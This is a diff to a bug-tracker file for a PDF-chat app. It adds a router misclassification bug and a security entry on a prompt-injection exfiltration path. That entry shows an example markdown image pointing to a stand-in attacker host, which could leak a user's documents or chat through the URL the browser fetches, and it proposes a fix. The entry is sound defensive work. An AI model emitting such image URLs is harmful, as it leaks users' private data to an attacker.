@@ -11,7 +11,7 @@ When an open item gets fixed, move it to "Fixed" with the date and the commit.
 
 | | Count |
 |---|---|
-| **Open** | **35**: ⚠️ important 2 · bugs 7 · robustness 8 · known gaps 8 · slowness 3 · hygiene 7 |
+| **Open** | **37**: ⚠️ important 2 · bugs 9 · robustness 8 · known gaps 8 · slowness 3 · hygiene 7 |
 | **Fixed** | **44** app bugs, design problems and doc fixes, plus 12 testing/tooling traps and 5 environment problems |
 
 ---
@@ -38,6 +38,8 @@ Both found on 2026-11-10 while reading the agent code. Neither is a crash: the a
 | 5 | Cancelling a stream only stops the browser | `/chat-stream` | The server still finishes the Gemini call and saves both messages |
 | 6 | Login with an unknown email answers faster than a wrong password | `auth.service.ts` `login` | A timing leak that reveals which emails exist. Fix: compare against a dummy hash |
 | 7 | The quiz offer's button is gone after a reload (text only) | AG.5, not persisted | Same root cause as #16 |
+| 39 | Chat answers render markdown **images**, so a model fooled by a PDF could write `![x](https://attacker.example/?d=…)` and the browser would fetch that URL on its own (the classic prompt-injection exfiltration path: the PDF's author learns whatever the model put in the URL, e.g. the user's other documents or chat). Raw HTML is already off and `javascript:` links are stripped | `frontend/src/components/chat/Markdown.tsx` (react-markdown renders `img` by default) | Found 2026-11-12 while writing the prompt-injection post. Fix: `disallowedElements={['img']}` (or `unwrapDisallowed`), or an `img` component that shows the alt text / a plain link instead of loading it. Links are fine: they need a click |
+| 38 | A real document question can be refused as smalltalk without the LLM ever checking | `router.service.ts` `vectorMayDecide` (smalltalk accepted at margin ≥ 0.03) | Found 2026-11-12 in the live prompt-injection test: "What is the signature drink?" (margin 0.061) and "What is the cafe's signature drink?" both went vector smalltalk → "I only answer questions based on your documents" for a fact that IS in the PDF. Same family as #25, but here it's a wrong answer, not just an extra call. Fix candidates: the smalltalk score floor (#25), or a higher smalltalk margin |
 
 ## Robustness (missing guards)
 
